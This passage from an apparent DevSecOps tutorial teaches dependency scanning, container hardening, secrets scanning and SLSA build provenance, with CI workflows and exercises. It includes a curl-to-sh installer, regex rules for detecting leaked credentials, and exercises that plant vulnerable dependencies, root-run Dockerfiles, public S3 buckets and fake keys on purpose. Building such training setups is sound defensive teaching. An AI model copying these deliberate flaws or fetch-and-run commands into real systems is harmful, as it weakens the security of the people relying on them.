   - An API endpoint accessible without authentication that should be protected
2. Create a Docker Compose file that starts both your API and the ZAP scanner
3. Write a GitHub Actions workflow that:
   - Starts the application
   - Runs `zap-api-scan.py` with your OpenAPI spec
   - Uploads the HTML report as an artifact
   - Fails the pipeline if any HIGH risk findings are found
4. Run the scan and review the report
5. Fix all HIGH and MEDIUM findings
6. Add a `.zap/rules.tsv` file to configure ZAP (disable one known false positive with justification)
7. Re-run the scan and verify the findings are resolved

**Expected output:** A working GitHub Actions pipeline with ZAP integration, a before-and-after comparison of ZAP reports showing resolved findings, and written documentation of each vulnerability found, its OWASP category, and the fix applied.

---

## Chapter 4: SCA — Software Composition Analysis {#chapter-4}

### The Library Problem: You Are Mostly Third-Party Code

Here is a surprising truth about modern software development: in a typical Python web application, the code *you* wrote represents maybe 5-10% of the total code that runs. The other 90-95% is code written by strangers — the authors of Flask, SQLAlchemy, boto3, requests, cryptography, and dozens of other libraries you imported.

This is brilliant for productivity. You don't have to write a web framework from scratch. But it introduces a critical security risk: **what if one of those libraries has a vulnerability?**

In 2021, a vulnerability called **Log4Shell (CVE-2021-44228)** was found in Log4j — a logging library used in millions of Java applications. The vulnerability allowed an attacker to execute arbitrary code just by causing a server to log a specially crafted string. Hundreds of thousands of applications were affected, including Apache, VMware, and Cisco products. The average developer had no idea they were using Log4j — it was a transitive dependency (a dependency of a dependency of a dependency).

**Software Composition Analysis (SCA)** is the practice of scanning your dependencies — every library, package, and module your code depends on — and checking them against databases of known vulnerabilities (CVEs).

### How SCA Works

SCA tools work in two steps:

1. **Inventory generation:** Parse your dependency files (`package.json`, `requirements.txt`, `pom.xml`, `go.mod`) to build a complete list of every direct and transitive dependency and their exact versions.

2. **Vulnerability matching:** Compare each dependency and version against vulnerability databases:
   - **NVD** (National Vulnerability Database) — the US government's CVE database
   - **OSV** (Open Source Vulnerabilities) — Google's vulnerability database
   - **GitHub Advisory Database** — GitHub's security advisories
   - **Snyk Vulnerability Database** — Snyk's proprietary, enriched database

### Tool 1: Snyk

**Snyk** is the most widely used SCA tool in the industry. It integrates with GitHub, GitLab, npm, pip, Docker, and Terraform. The free tier is generous enough for most projects.

**Installation:**
```bash
npm install -g snyk
```

**Authentication:**
```bash
snyk auth
# Opens a browser to authenticate with your Snyk account
```

**Scanning a Node.js project:**
```bash
cd my-node-app

# Test for vulnerabilities
snyk test
# Reads package.json and package-lock.json
# Checks all dependencies against the Snyk database
# Reports vulnerabilities with severity, CVE ID, and fix advice

# Monitor the project (sends results to Snyk dashboard)
snyk monitor
```

**Snyk output example:**
```
✗ High severity vulnerability found in lodash
  Description: Prototype Pollution
  Info: https://snyk.io/vuln/SNYK-JS-LODASH-1040724
  Introduced through: express@4.17.1 > lodash@4.17.20
  From: lodash@4.17.20
  Fix: Upgrade lodash to 4.17.21
```

Every line explained:
- `High severity` — the severity level (Critical, High, Medium, Low)
- `vulnerability found in lodash` — the vulnerable package
- `Description` — what type of vulnerability it is
- `Info` — a URL with full details in the Snyk database
- `Introduced through` — the dependency chain that introduced this package
- `From` — the exact version that is vulnerable
- `Fix` — the remediation advice (usually an upgrade path)

**Scanning a Python project:**
```bash
cd my-python-app

# Scan requirements.txt
snyk test --file=requirements.txt --package-manager=pip

# Or scan a pipenv/poetry project
snyk test --file=Pipfile
snyk test --file=pyproject.toml
```

**GitHub Actions integration:**
```yaml
# .github/workflows/snyk.yml

name: Snyk Security Scan

on:
  push:
    branches: [main]
  pull_request:

jobs:
  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        # Use snyk/actions/python@master for Python projects
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
          # Store your Snyk API token as a GitHub secret
        with:
          args: --severity-threshold=high
          # Only fail on HIGH or CRITICAL vulnerabilities
          # LOW and MEDIUM are reported but don't block the build
```

**Snyk Fix — Automatic Pull Requests:**

One of Snyk's most powerful features is its ability to automatically create pull requests that upgrade vulnerable dependencies. From the Snyk dashboard, click "Fix this vulnerability" and Snyk will create a PR with the upgraded dependency and a description of what was fixed.

### Tool 2: Grype

**Grype** (by Anchore) is an open-source vulnerability scanner for container images and filesystems. It's entirely free and runs locally without needing an account.

**Installation:**
```bash
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
```

**Scanning a container image:**
```bash
# Scan a Docker image
grype nginx:1.21.0

# Scan the current directory's packages
grype dir:.

# Only show HIGH and CRITICAL vulnerabilities
grype nginx:1.21.0 --fail-on high

# Output as JSON
grype nginx:1.21.0 -o json > grype-results.json
```

**Grype output:**
```
NAME         INSTALLED  FIXED-IN  TYPE   VULNERABILITY   SEVERITY
openssl      1.1.1f     1.1.1l    deb    CVE-2021-3449   Medium
libssl1.1    1.1.1f     1.1.1l    deb    CVE-2021-3449   Medium
curl         7.68.0     7.74.0    deb    CVE-2021-22876  High
```

Every column explained:
- `NAME` — the package name
- `INSTALLED` — the version currently installed
- `FIXED-IN` — the version that fixes the vulnerability
- `TYPE` — the package type (deb = Debian package, npm, pypi, etc.)
- `VULNERABILITY` — the CVE identifier
- `SEVERITY` — Critical, High, Medium, Low, Negligible

### Tool 3: OWASP Dependency-Check

**OWASP Dependency-Check** is a free, Java-based SCA tool that analyses your project's dependencies against the NVD. It supports Java, .NET, JavaScript, Python, and more.

```bash
# Using Docker
docker run --rm \
  --volume $(pwd):/src \
  --volume $(pwd)/report:/report \
  owasp/dependency-check \
  --scan /src \
  --format HTML \
  --out /report

# Flags:
# --volume  = mount directories into the container
# --scan    = directory to scan
# --format  = output format (HTML, JSON, XML, CSV)
# --out     = output directory for the report
```

### Tool 4: npm audit and pip-audit

For quick, no-setup vulnerability checks, both npm and pip include built-in audit tools.

**npm audit:**
```bash
# Run audit
npm audit

# Fix automatically-fixable vulnerabilities
npm audit fix

# Only show HIGH and CRITICAL
npm audit --audit-level=high

# Output as JSON
npm audit --json > npm-audit-results.json
```

**pip-audit:**
```bash
# Install pip-audit
pip install pip-audit

# Scan installed packages
pip-audit

# Scan a requirements.txt file
pip-audit -r requirements.txt

# Output as JSON
pip-audit --format json --output pip-audit-results.json

# Fix vulnerabilities automatically (generates fixed requirements.txt)
pip-audit --fix --dry-run
```

### The Problem of Transitive Dependencies

Direct dependencies are the packages you explicitly list in your `requirements.txt` or `package.json`. **Transitive dependencies** are the packages that *your dependencies* depend on. In a typical Node.js project, you might have 30 direct dependencies and 500+ transitive ones.

SCA tools scan both. When a transitive dependency has a vulnerability, the fix is usually to upgrade the direct dependency that brought it in. SCA tools show you the full chain:

```
YOUR APP
  └── express@4.17.1
        └── qs@6.7.0  ← vulnerable (CVE-2022-24999, Prototype Pollution)
```

To fix this, you upgrade `express` to a version that depends on a fixed version of `qs`.

### Common Beginner Mistakes

**Mistake 1: Only scanning direct dependencies.**
Most vulnerabilities come from transitive dependencies. Always scan the full dependency tree, not just what's in your manifest file.

**Mistake 2: Not locking dependency versions.**
If you use `express: "^4.0.0"` in package.json, npm might install any version from 4.0.0 to 4.99.99. Always use lock files (`package-lock.json`, `poetry.lock`, `Pipfile.lock`) and commit them to your repository. This ensures reproducible builds and makes SCA results accurate.

**Mistake 3: Running SCA only in CI.**
Add a pre-commit hook that runs a quick `npm audit` or `pip-audit` check. Catch vulnerabilities before they're even committed.

**Mistake 4: Upgrading blindly.**
`npm audit fix --force` can upgrade major versions that introduce breaking changes. Always test after fixing dependency vulnerabilities.

### How This Works in the Real World

A mature SCA workflow at a company like GitHub or Twilio:

1. **PR-time scanning:** Snyk or Grype scans every PR. HIGH/CRITICAL findings block merges.
2. **Scheduled scanning:** Full SCA runs nightly against all repositories. New CVEs published against your dependencies trigger automatic alerts even if you haven't pushed new code.
3. **Automatic fix PRs:** Snyk or Dependabot automatically creates PRs to upgrade vulnerable dependencies. Teams configure rules like "auto-merge if the upgrade is a patch version and CI passes."
4. **SLA tracking:** CRITICAL vulnerabilities must be resolved within 24 hours. HIGH within 7 days. Teams track compliance with SLAs in their security dashboard.

### Key Takeaways

- SCA scans your dependencies — all the third-party code your application uses — for known vulnerabilities
- Log4Shell showed the world how devastating untracked transitive dependencies can be
- Snyk is the industry leader with excellent CI integration and auto-fix PR capabilities
- Grype is a powerful free alternative excellent for container image scanning
- npm audit and pip-audit provide quick built-in scanning with no setup required
- Always scan the full dependency tree including transitive dependencies
- Lock your dependencies with lock files for reproducible, scannable builds

### Practical Task: Add Snyk to Your Repo — Fix All Critical Dependency Vulnerabilities Across npm and pip

**Task:**

1. Create a repository with both a Python backend (`requirements.txt`) and a Node.js frontend (`package.json`)
2. Deliberately use old, vulnerable versions of packages:
   - Python: `flask==0.12.2` (has known vulnerabilities), `pyyaml==5.1` (YAML injection)
   - Node.js: `lodash@4.17.15` (Prototype Pollution), `express@4.16.0`
3. Sign up for a free Snyk account and get your `SNYK_TOKEN`
4. Add `SNYK_TOKEN` to your GitHub repository secrets
5. Create a GitHub Actions workflow that:
   - Runs `snyk test --file=requirements.txt` for Python
   - Runs `snyk test` for Node.js
   - Fails the build on CRITICAL vulnerabilities
6. Run the workflow — observe the failures
7. Fix all CRITICAL vulnerabilities by upgrading dependencies
8. Re-run the workflow and confirm it passes
9. Document the CVEs you found and the versions that fix them

**Expected output:** A GitHub repository with working Snyk integration, a before/after comparison of Snyk reports, and a documented inventory of CVEs found, their CVSS scores, and the remediation applied for each.

---

## Chapter 5: Container Security {#chapter-5}

### Containers Are Not Magical Security Boundaries

Many developers assume that because containers isolate applications from each other, they're inherently secure. This is partially true — containers provide *process isolation* — but a container is only as secure as:

1. The base image it is built from
2. The Dockerfile instructions used to build it
3. The runtime configuration used to run it
4. The host system it runs on

Think of a container like a prefabricated room installed inside a building. The room is isolated from other rooms — but if you built it with defective materials, if the fire safety wasn't checked, or if the lock on the door is broken, isolation alone doesn't make you safe.

Container security has three layers we'll cover in this chapter:
1. **Image scanning** — finding vulnerabilities in the software installed in an image
2. **Base image hardening** — choosing and maintaining secure base images
3. **Distroless images** — reducing the attack surface by removing everything unnecessary

### Layer 1: Image Scanning with Trivy and Grype

**Trivy** (by Aqua Security) is the most widely used open-source container scanner. It scans:
- OS packages (Alpine, Debian, Ubuntu packages)
- Language dependencies (Python, Node.js, Java, Go)
- Dockerfile misconfigurations
- Kubernetes manifests

**Installing Trivy:**
```bash
# On macOS
brew install aquasecurity/trivy/trivy

# On Linux (Ubuntu/Debian)
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy
```

**Scanning a Docker image:**
```bash
# Scan the latest nginx image
trivy image nginx:latest

# Scan only for HIGH and CRITICAL vulnerabilities
trivy image --severity HIGH,CRITICAL nginx:latest

# Fail if any CRITICAL vulnerabilities are found
trivy image --exit-code 1 --severity CRITICAL nginx:latest

# --exit-code 1 = exit with code 1 (failure) if findings match the severity filter
# This is what CI uses to block the pipeline

# Scan a local image (one you just built)
trivy image --input myapp.tar
# First: docker save myapp:latest -o myapp.tar
```

**Scanning a Dockerfile for misconfigurations:**
```bash
trivy config ./Dockerfile

# Trivy will check for issues like:
# - Running as root
# - Using ADD instead of COPY
# - Not specifying USER
# - Using latest tag
# - Exposed sensitive ports
```

**Trivy in GitHub Actions:**
```yaml
# .github/workflows/trivy.yml

name: Container Security Scan

on:
  push:
    branches: [main]
  pull_request:

jobs:
  trivy:
    name: Scan Container Image
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .
        # Build the image using the Git commit SHA as the tag
        # This ensures every build is uniquely identified

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          # SARIF format uploads results to GitHub Security tab
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
          # Fail the build if CRITICAL or HIGH vulnerabilities are found

      - name: Upload Trivy scan results to GitHub Security tab
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'
          # This displays results inline in the GitHub Security tab
```

**SARIF** (Static Analysis Results Interchange Format) is a standardised format for security tool results that GitHub natively understands and displays in the Security tab and inline in PR diffs.

### Layer 2: Base Image Hardening

Your Dockerfile starts with a `FROM` instruction that pulls a base image. The base image is the foundation — every vulnerability in the base image is present in every container you build from it.

**Choosing a secure base image:**

| Base Image | Size | Security | Use Case |
|---|---|---|---|
| `ubuntu:latest` | ~77MB | Many packages, many CVEs | Development only |
| `debian:slim` | ~80MB | Fewer packages, fewer CVEs | General purpose |
| `alpine:3.x` | ~5MB | Minimal packages, few CVEs | Good default |
| `distroless` | ~2MB | No shell, no package manager | Production |
| Scratch | 0MB | Bare minimum | Compiled binaries (Go, Rust) |

**Dockerfile hardening best practices:**

```dockerfile
# BAD: Using latest tag - unpredictable, unversioned
FROM python:latest

# GOOD: Pin the exact version
FROM python:3.11.4-slim-bookworm

# ------------------------------------------------

# BAD: Running as root (default in Docker)
RUN pip install -r requirements.txt
CMD ["python", "app.py"]
# Everything runs as root - if the app is compromised, attacker has root access

# GOOD: Create and use a non-root user
RUN addgroup --system appgroup && \
    adduser --system --ingroup appgroup appuser
# addgroup creates a new system group called 'appgroup'
# adduser creates a new system user 'appuser' belonging to 'appgroup'

USER appuser
# All subsequent RUN, CMD, ENTRYPOINT instructions run as appuser
CMD ["python", "app.py"]

# ------------------------------------------------

# BAD: COPY everything into the image
COPY . /app
# This copies secrets, .git directories, local configs

# GOOD: Use .dockerignore and copy only what's needed
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
# --no-cache-dir = don't store pip's download cache in the image
COPY src/ /app/src/
# Only copy the source directory, not everything

# ------------------------------------------------

# BAD: Single RUN command that installs then doesn't clean up
RUN apt-get update
RUN apt-get install -y curl
# Creates multiple layers, leaves package lists in the image

# GOOD: Chain commands and clean up
RUN apt-get update && \
    apt-get install -y --no-install-recommends curl && \
    rm -rf /var/lib/apt/lists/*
# --no-install-recommends = don't install optional packages
# rm -rf /var/lib/apt/lists/* = delete package lists to reduce image size and CVE surface

# ------------------------------------------------

# BAD: Using ADD for local files (ADD has URL-fetching and tar-extraction side effects)
ADD app.tar.gz /app/

# GOOD: Use COPY for local files
COPY app/ /app/

# ------------------------------------------------

# BAD: Exposing everything
EXPOSE 22
EXPOSE 3306
EXPOSE 5432
# Never expose SSH, MySQL, PostgreSQL ports from application containers

# GOOD: Expose only the application port
EXPOSE 8080
```

**The `.dockerignore` file:**

Just like `.gitignore` prevents files from being committed to Git, `.dockerignore` prevents files from being copied into your Docker image:

```
# .dockerignore
.git/              # Git history
.env               # Environment files with secrets
*.log              # Log files
node_modules/      # Node modules (reinstall inside container)
__pycache__/       # Python cache
.pytest_cache/     # Test cache
*.test.js          # Test files
docs/              # Documentation
```

### Layer 3: Distroless Images

**Distroless images** are container images that contain *only the application and its runtime dependencies* — no shell, no package manager, no system utilities.

A traditional container based on Debian includes a shell (`/bin/bash`), package management tools (`apt`), system utilities (`ls`, `cat`, `curl`), and hundreds of other programs. If an attacker exploits your application and gains code execution inside the container, they can use all of these tools to:
- Explore the filesystem
- Install additional malware
- Connect to the internet
- Pivot to other systems

A distroless container has none of these. The attacker has code execution but almost nothing to execute.

**Multi-stage build with distroless:**

```dockerfile
# Stage 1: Build
# We use a full Python image to install dependencies and compile the app
FROM python:3.11.4-slim-bookworm AS builder

WORKDIR /app

# Install dependencies into a virtual environment
RUN python -m venv /opt/venv
# /opt/venv = the path where we create the virtual environment

ENV PATH="/opt/venv/bin:$PATH"
# Add the venv to PATH so pip and python use it

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY src/ .

# Stage 2: Production
# We use a distroless image as the final image
FROM gcr.io/distroless/python3-debian12
# This image contains Python 3 but NO shell, NO apt, NO curl

# Copy the virtual environment from the builder stage
COPY --from=builder /opt/venv /opt/venv
# --from=builder = copy from the stage named 'builder'

# Copy the application code
COPY --from=builder /app/src /app

ENV PATH="/opt/venv/bin:$PATH"
WORKDIR /app

# Distroless images use ENTRYPOINT, not CMD
ENTRYPOINT ["python", "main.py"]
```

**Why multi-stage builds matter for security:**
- All build tools (compilers, pip, apt) are left behind in the builder stage
- The final production image is minimal — only what's needed to run the app
- A drastically smaller image means a drastically smaller CVE surface area

### Common Beginner Mistakes

**Mistake 1: Using `latest` tag for base images.**
`latest` changes over time. Today `python:latest` might be Python 3.12. Tomorrow it could be 3.13 with breaking changes. Always pin to a specific version: `python:3.11.4-slim-bookworm`.

**Mistake 2: Running as root.**
Docker containers run as root by default. If your app has a code execution vulnerability, the attacker has root access to the container. Always use `USER` to run as a non-privileged user.

**Mistake 3: Storing secrets in the Dockerfile.**
```dockerfile
# NEVER DO THIS
ENV DATABASE_PASSWORD=mypassword
```
This password is embedded in every layer of the image and visible to anyone with access to the image. Use environment variables at runtime, or use secrets management tools like HashiCorp Vault or AWS Secrets Manager.

**Mistake 4: Not updating base images.**
Even if you pin your base image version, new CVEs are discovered all the time. Run image scans weekly and update your base image when high-severity CVEs are found.

### How This Works in the Real World

At companies running large-scale containerised workloads (Netflix, Uber, LinkedIn), container security is enforced through:

1. **An approved image registry:** Only images from the internal registry can be deployed. Images are scanned before they enter the registry and rejected if they have CRITICAL vulnerabilities.

2. **Automated weekly rescanning:** All images in the registry are rescanned weekly. If a new CVE is published that affects an in-use image, an alert is generated and the responsible team is notified.

3. **Runtime security (Falco):** Even with secure images, runtime security tools like Falco monitor container behaviour — if a container spawns a shell or makes unexpected network connections, it's flagged immediately.

### Key Takeaways

- Container security requires securing the image, the Dockerfile, and the runtime configuration
- Trivy is the leading open-source container image scanner with broad CI/CD support
- Pin base image versions; never use `latest`
- Run containers as non-root users always
- Use multi-stage builds to create minimal production images
- Distroless images remove the shell and utilities, making post-exploitation dramatically harder
- Use `.dockerignore` to prevent secrets and unnecessary files from entering the image

### Practical Task: Run Checkov on All Terraform Code, Trivy on All Dockerfiles — Zero HIGH Findings Before Merge

**Task:**

1. Create a repository with:
   - A Python application with a `Dockerfile`
   - A Terraform module that provisions an S3 bucket and an EC2 instance
2. In the Dockerfile, introduce at least three issues Trivy will catch:
   - Use `FROM ubuntu:latest` (unpinned)
   - Run as root (no USER instruction)
   - Copy entire project including `.env` file
3. In Terraform, introduce at least two Checkov findings:
   - S3 bucket with public read access enabled
   - EC2 instance without encrypted EBS volumes
4. Write a GitHub Actions workflow that:
   - Builds the Docker image with `docker build`
   - Runs `trivy image --exit-code 1 --severity HIGH,CRITICAL`
   - Runs `checkov -d ./terraform --hard-fail-on HIGH`
   - Blocks the PR if either tool finds HIGH findings
5. Fix all issues in both the Dockerfile and Terraform
6. Re-run the pipeline to confirm zero HIGH findings

**Expected output:** A repository with working Trivy and Checkov CI integration, documented before/after findings for both tools, and a secure Dockerfile using a pinned Alpine base image, non-root user, and multi-stage build.

---

## Chapter 6: Secrets Scanning {#chapter-6}

### The Most Common Cause of Breaches You've Never Heard Of

In 2019, a security researcher found an Amazon Web Services access key committed to a public GitHub repository. That single credential gave them access to an S3 bucket containing 540 million Facebook records. The developer who committed it didn't mean to — they copied a config file during development and forgot to remove the credential before pushing.

This happens constantly. A 2022 study by GitGuardian found that **over 6 million secrets were exposed in public GitHub repositories** in a single year — API keys, database passwords, private certificates, tokens. Many of these give direct access to production systems.

The terrifying part: Git history is forever. Even if you delete the file and push a new commit, the secret is still in your Git history and can be recovered with `git log`. Bots continuously scan GitHub for newly committed secrets.

**Secrets scanning** automatically detects credentials in your code, preventing them from ever reaching a repository.

### What Counts as a Secret?

Secrets scanners detect:
- Cloud provider credentials (AWS access keys, GCP service account keys)
- API tokens (GitHub tokens, Slack tokens, Stripe keys, Twilio tokens)
- Database connection strings with passwords
- Private keys (RSA, PGP, SSH private keys)
- JWT secrets
- Basic auth credentials in URLs (`https://user:password@api.example.com`)
- `.env` files

### Tool 1: TruffleHog

**TruffleHog** is an open-source secrets scanner that uses both regex patterns and entropy analysis to find secrets. High-entropy strings (random-looking strings with many different characters) are likely secrets.

**Installation:**
```bash
# Using pip
pip install trufflehog3

# Using Homebrew (macOS)
brew install trufflehog

# Using Docker
docker pull trufflesecurity/trufflehog:latest
```

**Scanning a Git repository:**
```bash
# Scan entire Git history of the current repo
trufflehog git file:///path/to/your/repo

# Scan a GitHub repository (including its history)
trufflehog github --repo https://github.com/org/repo

# Scan only recent commits (since the last CI run)
trufflehog git file://. --since-commit HEAD~5
# HEAD~5 = 5 commits ago

# Scan with only verified secrets (reduce false positives)
trufflehog git file://. --only-verified
# TruffleHog verifies discovered credentials against APIs
# A verified finding means the credential actually works
```

**GitHub Actions integration:**
```yaml
# .github/workflows/secrets-scan.yml

name: Secrets Scanning

on:
  push:
  pull_request:

jobs:
  trufflehog:
    name: TruffleHog Secrets Scan
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          # CRITICAL: fetch-depth: 0 fetches the ENTIRE git history
          # Without this, TruffleHog can only scan the latest commit
          # Secrets from previous commits would be missed

      - name: TruffleHog Secrets Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          # Scan commits since the base branch (only new commits in this PR)
          head: HEAD
          extra_args: --only-verified
          # Only report confirmed, working credentials
```

### Tool 2: GitGuardian

**GitGuardian** is a commercial secrets scanning platform with a free tier for public repositories. It's widely used in enterprise environments because it:

- Monitors your entire GitHub/GitLab organisation continuously
- Sends real-time alerts when secrets are detected
- Provides a web dashboard for managing and resolving incidents
- Has over 350 secret detectors for specific credential types

**GitHub Actions integration:**
```yaml
# .github/workflows/gitguardian.yml

name: GitGuardian Security Checks

on:
  push:
  pull_request:

jobs:
  scanning:
    name: GitGuardian scan
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          # Always fetch full history for secrets scanning

      - name: GitGuardian scan
        uses: GitGuardian/ggshield-action@v1
        env:
          GITHUB_PUSH_BEFORE_SHA: ${{ github.event.before }}
          GITHUB_PUSH_BASE_SHA: ${{ github.event.base }}
          GITHUB_PULL_BASE_SHA: ${{ github.event.pull_request.base.sha }}
          GITHUB_DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
          GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}
          # Store your GitGuardian API key as a GitHub secret
```

### Tool 3: gitleaks

**gitleaks** is a fast, open-source secrets scanner written in Go. It's popular for its speed, extensive built-in ruleset, and easy customisation.

**Installation:**
```bash
# macOS
brew install gitleaks

# Linux (download from GitHub releases)
wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.18.1_linux_x64.tar.gz
tar -xzf gitleaks_8.18.1_linux_x64.tar.gz
mv gitleaks /usr/local/bin/
```

**Running gitleaks:**
```bash
# Scan the current repository
gitleaks detect

# Scan only the staged changes (pre-commit mode)
gitleaks protect --staged
# --staged = only scan files staged for commit (perfect for pre-commit hooks)

# Scan with verbose output
gitleaks detect --verbose

# Output as JSON
gitleaks detect --report-format json --report-path gitleaks-report.json
```

**Setting up gitleaks as a pre-commit hook:**

```bash
# Install pre-commit framework
pip install pre-commit

# Create .pre-commit-config.yaml
```

```yaml
# .pre-commit-config.yaml

repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.1   # Use the latest stable version
    hooks:
      - id: gitleaks
        # Runs on every `git commit` attempt
        # If secrets are found, the commit is blocked
        # The developer sees the finding and must remove the secret
```

```bash
# Install the hooks
pre-commit install

# Test by staging a fake secret
echo 'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' > test.env
git add test.env
git commit -m "test"
# Expected output: gitleaks blocks the commit and reports the AWS key
```

**Custom gitleaks rules:**

Sometimes you need to scan for organisation-specific secrets (internal API tokens, private keys with custom formats):

```toml
# .gitleaks.toml

title = "Custom Gitleaks Configuration"

[[rules]]
id = "internal-api-key"
# A unique identifier for this rule

description = "Internal API Key"
# Human-readable description

regex = '''MYCOMPANY-[A-Z0-9]{32}'''
# The regex pattern to search for
# This matches tokens like: MYCOMPANY-A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6

tags = ["key", "internal"]
# Labels for categorising this finding

[[rules]]
id = "database-url-with-password"
description = "Database Connection String"
regex = '''(postgres|mysql|mongodb):\/\/[^:]+:[^@]+@'''
# Matches database URLs with embedded passwords like:
# postgres://user:password@host:5432/db
```

### What to Do When You Find a Secret in History

If a secret is discovered in Git history, you have two tasks:

**Task 1: Revoke the secret immediately.**
Go to the platform (AWS, GitHub, Stripe, etc.) and invalidate/rotate the credential. Do this first — assume it has been seen and used. Don't wait.

**Task 2: Remove from Git history.**
Use `git filter-repo` (preferred over the deprecated `git filter-branch`):

```bash
# Install git-filter-repo
pip install git-filter-repo

# Remove a file from all of Git history
git filter-repo --path secrets.txt --invert-paths
# --path secrets.txt   = the file to target
# --invert-paths       = remove it (rather than keeping it)

# Or replace the secret value throughout history
git filter-repo --replace-text <(echo 'AKIAEXAMPLEKEY123456==>REDACTED')
# Replaces the specific secret value with 'REDACTED' in every commit
```

**Important:** After rewriting history, you must force-push to GitHub and notify all collaborators to rebase. This is disruptive, which is why prevention (pre-commit hooks) is far better than remediation.

### Common Beginner Mistakes

**Mistake 1: Relying on `.gitignore` alone.**
`.gitignore` prevents files from being tracked, but developers often add files before `.gitignore` is in place, or accidentally use `git add -f` (force). Secrets scanners are the safety net.

**Mistake 2: Not scanning Git history.**
Most secrets scanners only scan the current file state by default. Configure them to scan the entire Git history — this is where most historical leaks live.

**Mistake 3: Using environment variables only locally.**
A `.env` file on your laptop is fine. But if that `.env` file accidentally gets committed, all those values are exposed. Use `.gitignore`, use pre-commit hooks, and never hardcode values.

**Mistake 4: Not rotating after discovery.**
Removing a secret from code doesn't mean it hasn't been seen. Always rotate credentials when they're found, even if you're not sure they were ever exposed.

### How This Works in the Real World

Forward-thinking engineering organisations enforce a multi-layer secrets protection strategy:

1. **Developer education:** New engineers learn on day one that secrets in code = immediate security incident
2. **IDE plugins:** Snyk or GitGuardian IDE plugins warn before you even save the file
3. **Pre-commit hooks:** gitleaks blocks the commit on the developer's machine
4. **CI scanning:** TruffleHog or GitGuardian scans every PR with full history
5. **Organisation-wide monitoring:** GitGuardian continuously monitors all repositories
6. **Automatic rotation:** For cloud credentials, AWS Secrets Manager and similar services auto-rotate secrets on a schedule

### Key Takeaways

- Secrets in code — past or present — are a critical security risk and the leading cause of many high-profile breaches
- TruffleHog scans Git history with entropy analysis and can verify credentials against APIs
- GitGuardian provides organisation-wide monitoring with 350+ detectors
- gitleaks is fast, open-source, and excellent for pre-commit hooks
- Always scan full Git history, not just the current state of files
- When a secret is found: revoke first, clean history second
- Pre-commit hooks are your best defence — stopping secrets before they even reach the repository

### Practical Task: Set Up TruffleHog Pre-commit Hook and CI Step — Simulate a Secret Leak and Verify Detection

**Task:**

1. Create a new Git repository with a simple application
2. Set up a `.pre-commit-config.yaml` file with TruffleHog or gitleaks
3. Install pre-commit with `pre-commit install`
4. Create a `.github/workflows/secrets-scan.yml` workflow using the TruffleHog GitHub Action
5. **Simulate a leak:**
   a. Create a file called `config/database.py` containing: `DB_PASSWORD = "MyS3cr3tP@ssword"` and a fake AWS key: `AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"`
   b. Attempt to `git add` and `git commit` the file
   c. Verify the pre-commit hook blocks the commit
6. **Simulate a CI detection:**
   a. Temporarily disable the pre-commit hook
   b. Force the commit through
   c. Open a PR and observe TruffleHog detecting the secret in CI
7. Remove the file, create a `.gitignore` entry for credential files, and configure a gitleaks `.gitleaks.toml` to add your organisation's specific token format as a custom rule
8. Verify clean detection after remediation

**Expected output:** Evidence of both pre-commit blocking and CI detection of the simulated secret, a configured `.pre-commit-config.yaml`, a working GitHub Actions secrets scan workflow, and a custom gitleaks rule.

---

## Chapter 7: The SLSA Framework {#chapter-7}

### The Problem SLSA Solves: Can You Trust Your Build?

Here is a scenario: a developer writes clean, reviewed code and merges it to `main`. Later, the production application starts behaving maliciously — but when the code is reviewed, nothing is wrong.

What happened? An attacker gained access to the CI/CD pipeline and modified the build process. The source code was fine, but the binary that came out of the build was compromised. The build system itself was the attack vector.

This is exactly what happened in the SolarWinds attack. The source code that developers wrote was legitimate. But the build system that compiled it injected malicious code, producing a corrupted binary that looked completely legitimate. Thousands of organisations downloaded and ran it.

The **SLSA framework** (Supply chain Levels for Software Artifacts, pronounced "salsa") is a framework developed by Google (now under OpenSSF) to prevent exactly this class of attack. It provides a graduated set of requirements for protecting the build process and creating verifiable provenance — proof that a specific binary was produced from specific source code by a specific build system.

### Understanding SLSA Levels

SLSA defines four levels, each building on the last:

**SLSA Level 1: Provenance Exists**
- The build process generates provenance (a machine-readable document describing who built what, when, and from what source)
- The provenance is not yet verified or tamper-resistant
- Value: Basic auditability — you can trace what went into a build

**SLSA Level 2: Signed Provenance from a Hosted Build Service**
- The provenance is signed by the build service (e.g., GitHub Actions)
- This means you can verify the provenance hasn't been tampered with
- The build is run on a hosted CI service (not a developer's local machine)
- Value: You can verify a binary was produced by a CI pipeline, not a compromised developer machine

**SLSA Level 3: Hardened Build Service**
- The build platform is hardened against insider attacks
- Build environments are ephemeral (destroyed after each build)
- The build process is hermetic (no network access during the build)
